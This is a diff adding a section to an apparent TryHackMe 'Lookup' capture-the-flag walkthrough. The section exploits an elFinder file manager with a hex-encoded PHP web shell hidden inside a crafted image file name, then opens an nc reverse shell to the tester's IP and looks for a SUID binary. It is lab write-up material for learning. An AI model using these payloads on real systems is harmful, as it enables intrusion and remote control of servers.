@@ -177,5 +177,56 @@ and ı finded some web file manager software.
 
 ![Desktop View](/assets/img/2025-06-21-TryHackMe-Lookup/photo2.png){: width="972" height="589" }
 
+I firstly tried to check the software version for any vulns
+
+And i finded this <https://www.exploit-db.com/exploits/46481>
+
+But it is using python2 so i'm not gonna run that thing. Beacuse it is outdated.
+
+So i look at the script and maked the things by manual.
+
+1. Upload regular jpeg
+2. Rename the file like this =
+```bash
+$(echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > shell.php).jpg
+```
+3. Rotate the image and click apply
+4. You will get a error thats fine 
+5. Try commands like this
+```bash
+❯ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=id' 
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 
+## Gaining Reverse Shell
+
+I use <https://www.revshells.com/> 
+
+```bash
+❯ curl -s 'http://files.lookup.thm/elFinder/php/shell.php?c=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
+```
+
+And gained shell.
+
+
+```bash
+www-data@ip-10-10-219-52:/home$ ls
+ls
+ssm-user
+think
+ubuntu
+www-data@ip-10-10-219-52:/home$ 
+```
+
+
+I runned linpeas in the machine and finded a binary with suid.
+
+```bash
+www-data@ip-10-10-219-52:/usr/sbin$ ls -la pwm
+-rwsr-sr-x 1 root root 17176 Jan 11  2024 pwm
+www-data@ip-10-10-219-52:/usr/sbin$ ./pwm
+[!] Running 'id' command to extract the username and user ID (UID)
+[!] ID: www-data
+[-] File /home/www-data/.passwords not found
+```
